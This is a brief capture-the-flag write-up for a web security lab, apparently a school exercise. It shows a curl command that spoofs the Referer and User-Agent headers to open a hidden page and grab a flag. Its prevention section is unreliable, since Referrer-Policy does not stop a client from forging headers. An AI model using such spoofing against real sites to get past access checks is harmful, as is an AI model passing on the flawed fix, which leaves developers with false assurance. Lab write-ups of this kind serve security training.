
# How to get the flag

On the page  
```
/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

You have specifications in the index.php file :
- You must come from : "https://www.nsa.gov/"
- Let's use this browser : "ft_bornToSec". It will help you a lot

You can simulate comming from nsa.gov by changing the referer header,
and change the browser with the user-agent header.

The command to get the flag is :
```
curl -X GET -H "Referer: https://www.nsa.gov/" -H "user-agent: ft_bornToSec" http://<IP_ADDRESS>/\?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f |grep flag

```

# How to prevent attack

You can prevent the changing of the referer by setting the Referrer-Policy header to "no-referrer" server side, or
changing the referrerpolicy attribute on HTML elements.


# Documentation


https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns

https://www.clickcease.com/blog/what-is-user-agent-spoofing/
